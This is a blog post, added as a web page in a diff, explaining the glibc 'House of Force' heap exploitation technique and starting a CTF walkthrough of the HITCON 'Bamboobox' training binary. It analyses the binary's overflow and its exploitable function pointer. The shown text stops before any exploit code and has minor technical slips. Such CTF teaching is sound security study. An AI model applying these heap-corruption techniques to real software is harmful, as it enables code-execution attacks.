@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>House of Force :: xcr0</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Explanation of the House of Force" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://xcr0.github.io/posts/force/" />
+
+<meta name="google-site-verification" content="tn8JztGkSZ7fqKquNJN730NfUJJR2wyABLpVx5GCh6Y" />
+
+
+<link rel="stylesheet" href="https://xcr0.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://xcr0.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://xcr0.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://xcr0.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://twitter.com/extcr0/" />
+  
+    <meta name="twitter:creator" content="xcr0" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="House of Force">
+<meta property="og:description" content="Explanation of the House of Force" />
+<meta property="og:url" content="https://xcr0.github.io/posts/force/" />
+<meta property="og:site_name" content="xcr0" />
+
+  
+    <meta property="og:image" content="https://xcr0.github.io/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-03-15 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    xcr0
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/notes">Notes</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+        
+          <li><a href="/tags">Tags</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/notes">Notes</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+      
+        <li><a href="/tags">Tags</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://xcr0.github.io/posts/force/">House of Force</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-03-15
+        
+      </span>
+    
+    
+      <span class="post-author">:: xcr0</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://xcr0.github.io/tags/pwn/">pwn</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#hitcon-training---bamboobox">HITCON Training - Bamboobox</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>This is going to be a multi part series demonstrating and explaining each house exploitation technique
+as best i can. I will also be including several binaries which demonstrate these techniques, so we
+can get experience in practically using them within ctfs.</p>
+<p>Okay, what is the House of Force? This is an exploitation technique that involved exploiting a loophole
+within the wilderness to trick malloc into allocating chunks outside the bounds of the heap. The most
+recent technique is only applicable to glibc &lt; 2.29, which means this challenge will not work on your
+system. You can check your glibc version by using ldd to find the path to libc, then just simply running
+it. My current libc version is 2.33 so i will be needing a virtual machine for this challenge. I
+reccomend using vagrant, though docker would work just fine.</p>
+<p>The exploit will be using glibc 2.23, so if there is any issues with the exploit on your docker image
+or virtual machine then it might be that. Ubuntu Xenial 16.04 is the version I am running.</p>
+<p>Some conditions that are required in order to perform the &ldquo;House of Force&rdquo;, is an unrestricted heap
+overflow that will be able to reach and overwrite the METADATA of the top chunk, also known as the
+wilderness. We must also have the ability to dicate how large our allocation size will be, when
+passing it to malloc.</p>
+<p>The reason we need this, is if we can overwrite the wilderness, with say 0xffffffff. Malloc will think
+that the space on the heap is MASSIVE and will no longer ask the operating system for extra memory. This
+means that we will be able to allocate chunks OUTSIDE of the heap, with malloc still thinking that
+we are within the bounds since the only way it knows the chunk size, is from the wilderness.</p>
+<p>lets visualize this:</p>
+<pre tabindex="0"><code>           AAAAAAAAAAAA  0x20300
+[metadata][usable_chunk][metadata][      top_chunk       ][end of heap]
+</code></pre><p>okay, as we can see, we have allocated 1 chunk on the heap. The top chunk is the space left on the
+stack, and the &ldquo;metadata&rdquo; of the top chunk, the wilderness will hold the size of the top chunk. Or the
+space left on the heap, before malloc must request more memory from the operating system to grow the
+stack, or mmap our allocation directly.</p>
+<p>now lets perform a heap overflow, and see what what happens when we overwrite the wilderness</p>
+<pre tabindex="0"><code>          AAAAAAAAAAAAAAAffffffff
+[metadata][usable_chunk][metadata][      top_chunk       ][end of heap]
+</code></pre><p>okay, so the wilderness is now the largest value that we can represent within 4 bytes. Lets allocate
+a new chunk, and see what we can do with it:</p>
+<pre tabindex="0"><code>          AAAAAAAAAAAAAAAffffffff
+[metadata][usable_chunk][metadata][      top_chunk       ][end of heap]
+                        [metadata][AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
+</code></pre><p>now as we can see, malloc will NOT request memory to grow the heap, as it doesnt look like it needs to!
+it will only check for the size of the top chunk, but since we overwrote that wilderness value, we are
+allowed to allocate chunks outside of the heap.</p>
+<p>this may provide us with interesting exploitation scenarios and techniques</p>
+<h2 id="hitcon-training---bamboobox">HITCON Training - Bamboobox<a href="#hitcon-training---bamboobox" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>This binary has 2 methods of exploitation, each only valid for older versions of glibc. I will be using
+Ubuntu Xenial 16.04, which uses glibc 2.23. This version of glibc has practically no protections
+or heap hardening, so we should be able to get away with an archaic tecniques from Phantasmal
+Phantasmagoria&rsquo;s phrack article.</p>
+<p>One of these techniques is called house of force, in which i will attempt to get into later. The
+vulnerability within the binary is a heap overflow, which leads to us being allowed to edit free
+chunks. Since we are allowed to edit the metadata on the heap, this can lead to many many exploitable
+scenarios.</p>
+<p>We can leverage this heap overflow to craft an unlink exploit as well. In the recent glibc versions, this
+exploit has been mitigated with &ldquo;safe linking&rdquo;. It eliminates a 20 year old bug within the heap, and
+will secure the fd and bk pointer from giving us an arbitrary write what where whenever we use the
+unlink macro.</p>
+<p>However, there has been ANOTHER complex technique that bypasses this safe linking mitigation, called
+House of Rust. I will not be demonstrating that within the unlink exploitation part of this challenge,
+as it deserves it&rsquo;s own post. Anyways, lets get on with the exploitation of the binary.</p>
+<p>we will first start off with reversing the binary, we are given the source of the binary but it is
+still important to look at the disassembly. The real code is the binary, not the source, there may
+be optimizations or weird implementations that the compiler has generated, that the high level c
+code will not show. It is important to understand the details, so lets analyze both the source and the
+disassembly.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> item{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> size;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> box{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>hello_message)();
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>goodbye_message)();
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> item itemlist[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> num;
+</span></span></code></pre></div><p>here we can see the global variables, we have a item structure that will be used as a global object to
+represent an item. This item will be stored in the itemlist, which contains a static amount of 100 entries.
+This item struct&rsquo;s size will be 12 bytes. This does not exactly matter as each of these structures will
+be under 24 bytes which is the minimum usable chunk returned to by ptmalloc2. The reason for this is due
+to the fact that a 32 bit integer is 4 bytes, and char* name is a char pointer, which will hold an
+address to the string within memory instead of containing the char array inside the object.</p>
+<p>Next, we have a box structure, which will contain function pointers that will most likely be executed. We
+see this a lot within challenges, as this gives us a way to gain code execution if we get an arbitrary
+write over this object in the heap. This is a function pointer, so it will be 16 bytes in size, as this
+is a 64 bit binary.</p>
+<p>There is a global num integer, this will be stored as 4 bytes .bss as it is a global 32 bit signed integer
+to represents the amount of entries within itemlist.</p>
+<p>Lets continue to the main function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> choicebuf[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> choice;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> box <span style="color:#f92672">*</span>bamboo ;
+</span></span><span style="display:flex;"><span>	setvbuf(stdout,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	setvbuf(stdin,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	bamboo <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> box));
+</span></span><span style="display:flex;"><span>	bamboo<span style="color:#f92672">-&gt;</span>hello_message <span style="color:#f92672">=</span> hello_message;
+</span></span><span style="display:flex;"><span>	bamboo<span style="color:#f92672">-&gt;</span>goodbye_message <span style="color:#f92672">=</span> goodbye_message ;
+</span></span><span style="display:flex;"><span>	bamboo<span style="color:#f92672">-&gt;</span>hello_message();
+</span></span></code></pre></div><p>okay, so it will allocate a char buffer of 8 chars, which will store our integer input. It will then
+allocate an integer called choice, and allocate an object from the box structure called bamboo. It will
+then disable output and input buffering, then allocate a box structure on the heap. This is a pretty dumb
+way to do this, this would be much better:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> box<span style="color:#f92672">*</span> bamboo<span style="color:#f92672">=</span>(<span style="color:#66d9ef">struct</span> box<span style="color:#f92672">*</span>)malloc(<span style="color:#66d9ef">sizeof</span>(box));
+</span></span></code></pre></div><p>this code defines a clear purpose, and will not be split up between other code. Anyways, after the allocation
+it will point the hello_message function pointer to hello_message(), and goodbye_message to goodbye_message().</p>
+<p>it will then CALL hello_message() from that bamboo object. There is only 1 bamboo object here, and its only
+purpose is to store and call the hello and goodbyte function pointers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>		menu();
+</span></span><span style="display:flex;"><span>		read(<span style="color:#ae81ff">0</span>,choicebuf,<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>		choice <span style="color:#f92672">=</span> atoi(choicebuf);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">switch</span>(choice){
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>				show_item();
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>				add_item();
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>				change_item();
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>				remove_item();
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>				bamboo<span style="color:#f92672">-&gt;</span>goodbye_message();
+</span></span><span style="display:flex;"><span>				exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>				puts(<span style="color:#e6db74">&#34;invaild choice!!!&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span> ;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>okay, this is just a simple menu. Something that should be noted is that, WE are allowed to control when
+bamboo-&gt;goodbye_message() will be called. That means that if we can overwrite that function pointer, we can
+gain code execution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hello_message</span>(){
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;There is a box with magic&#34;</span>);
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;what do you want to do in the box&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">goodbye_message</span>(){
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;See you next time&#34;</span>);
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;Thanks you&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>okay, so this is the hello and goodbye message that the bamboobox will contain function pointers to.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">menu</span>(){
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;----------------------------&#34;</span>);
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;Bamboobox Menu&#34;</span>);
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;----------------------------&#34;</span>);
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;1.show the items in the box&#34;</span>);
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;2.add a new item&#34;</span>);
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;3.change the item in the box&#34;</span>);
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;4.remove the item in the box&#34;</span>);
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;5.exit&#34;</span>);
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;----------------------------&#34;</span>);
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;Your choice:&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>menu function, nothing else to say.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">show_item</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> i ;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>num){
+</span></span><span style="display:flex;"><span>		puts(<span style="color:#e6db74">&#34;No item in the box&#34;</span>);
+</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>; i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span>(itemlist[i].name){
+</span></span><span style="display:flex;"><span>				printf(<span style="color:#e6db74">&#34;%d : %s&#34;</span>,i,itemlist[i].name);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		puts(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>it will allocate an &ldquo;i&rdquo; integer on the stak, and use it as a counter in the for loop.
+if the global num is still undefined/uninitialized, it will tell us that there are no
+items inside of the box.</p>
+<p>else, it will iterate through itemlist, and print the index and name within each object.</p>
+<p>This is also an extremely stupid idea, as you do not need to iterate through each and
+every entry within the itemlist, you only need to iterate UNTIL you reach num. Im sure
+that the creators of the binary did this on purpose, as the num global integer has
+not been defined. If there was a reason behind leaving it undefined, then it may
+come in handy later.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add_item</span>(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> sizebuf[<span style="color:#ae81ff">8</span>] ;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> length ;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> i ;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> size ;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(num <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>){
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;Please enter the length of item name:&#34;</span>);
+</span></span><span style="display:flex;"><span>		read(<span style="color:#ae81ff">0</span>,sizebuf,<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>		length <span style="color:#f92672">=</span> atoi(sizebuf);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(length <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>			puts(<span style="color:#e6db74">&#34;invaild length&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span> ; i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>itemlist[i].name){
+</span></span><span style="display:flex;"><span>				itemlist[i].size <span style="color:#f92672">=</span> length ;
+</span></span><span style="display:flex;"><span>				itemlist[i].name <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)malloc(length);
+</span></span><span style="display:flex;"><span>				printf(<span style="color:#e6db74">&#34;Please enter the name of item:&#34;</span>);
+</span></span><span style="display:flex;"><span>				size <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>,itemlist[i].name,length);
+</span></span><span style="display:flex;"><span>				itemlist[i].name[size] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\x00&#39;</span>;
+</span></span><span style="display:flex;"><span>				num<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>		puts(<span style="color:#e6db74">&#34;the box is full&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>next, we have our add item function. This will do exactly as the name suggests, it will
+add an item. First, it initializes a few variables, an 8 byte char array, and 3
+uninitialized integers called length, i, and size.</p>
+<p>the global num integer has not been initialized, yet it is being incremented. This is not
+an inherint security vulnerability, though it may lead to undefined behaviour. The compiler
+might detect and initialize for us, but we dont know that. That is why we need to read the
+disassembly.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">change_item</span>(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> indexbuf[<span style="color:#ae81ff">8</span>] ;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> lengthbuf[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> length ;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> index ;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> readsize ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>num){
+</span></span><span style="display:flex;"><span>		puts(<span style="color:#e6db74">&#34;No item in the box&#34;</span>);
+</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;Please enter the index of item:&#34;</span>);
+</span></span><span style="display:flex;"><span>		read(<span style="color:#ae81ff">0</span>,indexbuf,<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>		index <span style="color:#f92672">=</span> atoi(indexbuf);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(itemlist[index].name){
+</span></span><span style="display:flex;"><span>			printf(<span style="color:#e6db74">&#34;Please enter the length of item name:&#34;</span>);
+</span></span><span style="display:flex;"><span>			read(<span style="color:#ae81ff">0</span>,lengthbuf,<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>			length <span style="color:#f92672">=</span> atoi(lengthbuf);
+</span></span><span style="display:flex;"><span>			printf(<span style="color:#e6db74">&#34;Please enter the new name of the item:&#34;</span>);
+</span></span><span style="display:flex;"><span>			readsize <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>,itemlist[index].name,length);
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">*</span>(itemlist[index].name <span style="color:#f92672">+</span> readsize) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\x00&#39;</span>;
+</span></span><span style="display:flex;"><span>		}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>			puts(<span style="color:#e6db74">&#34;invaild index&#34;</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>our next function is the change item. It will allow us to change the size and contents of our
+item object. Lets see how they implement that and check for any surface level vulnerabilities
+within the code.</p>
+<p>it will read in 8 bytes, each representing an integer that will be converted with atoi. I
+believe that this is used as opposed to scanf due to scanf not having any bounds checking. We
+could easily overflow this integer if we had used scanf, and introduce more undefined behaviour.</p>
+<p>If num has not been initialized, or if there isnt any value within num, it will tell us that
+there are no items within the box. else, it will ask us for the index of the item object to
+edit/change.</p>
+<p>if that index HAS a name char pointer, it will prompt us with the edit menu. else it will exit and
+tell us that there is an invalid index.</p>
+<p>else, if that index exists, it will ask us fro the length of our item name. It will read in the
+length, and store it inside the local &ldquo;length&rdquo; integer. Next, this part seems pretty complicated
+since c syntax is pretty strange, but if you understand assembler it should be too hard.</p>
+<p>It will ask us for the new name of the item, when we enter it will allow us to read in the length
+we provided into our name member within the item object. Now, this next function&rsquo;s purpose is to
+remove the trailing &lsquo;\n&rsquo; that read() will read in. it will dereference the address of the char pointer
+to access the real value of the char, instead of the pointer, and add/increment it by the amount of
+bytes read in. It will then change that last char into a null terminating byte.</p>
+<p>the read() system call or c library wrapper, will return the amount of bytes that read had read into
+the buffer.</p>
+<p>in assembler psuedo code, it would look something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> rdi, [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>]			   <span style="color:#75715e">; index value, i just made a random offset for index.</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> rax, [obj.itemlist<span style="color:#f92672">+</span>rdi<span style="color:#f92672">*</span><span style="color:#ae81ff">12</span>] <span style="color:#75715e">; obj.itemlist used as base pointer + index*sizeof(item) ; dereference</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> rcx, [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x12</span>]			   <span style="color:#75715e">; readsize offset, again this is just my best guess</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span> rax, rcx				   <span style="color:#75715e">; increment through char array until last char reached, &#39;\n&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0</span>					   <span style="color:#75715e">; change \n into \x00</span>
+</span></span></code></pre></div><p>this is just pseudocode on how that snippet of c code should work. Lets move onto the next function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">remove_item</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> indexbuf[<span style="color:#ae81ff">8</span>] ;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> index ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>num){
+</span></span><span style="display:flex;"><span>		puts(<span style="color:#e6db74">&#34;No item in the box&#34;</span>);
+</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;Please enter the index of item:&#34;</span>);
+</span></span><span style="display:flex;"><span>		read(<span style="color:#ae81ff">0</span>,indexbuf,<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>		index <span style="color:#f92672">=</span> atoi(indexbuf);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(itemlist[index].name){
+</span></span><span style="display:flex;"><span>			free(itemlist[index].name);
+</span></span><span style="display:flex;"><span>			itemlist[index].name <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ;
+</span></span><span style="display:flex;"><span>			itemlist[index].size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ;
+</span></span><span style="display:flex;"><span>			puts(<span style="color:#e6db74">&#34;remove successful!!&#34;</span>);
+</span></span><span style="display:flex;"><span>			num<span style="color:#f92672">--</span> ;
+</span></span><span style="display:flex;"><span>		}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>			puts(<span style="color:#e6db74">&#34;invaild index&#34;</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>it will free the name member of the object. It will then null out the name and size pointers of the freed
+object to prevent a uaf bug. it will then decrement the global num counter, as we have just delted one entry.</p>
+<p>I am not sure how this works from a first glance, but why would they object.name only? does that mean the size
+value still exists on the heap? we will have to make sure later in gdb.</p>
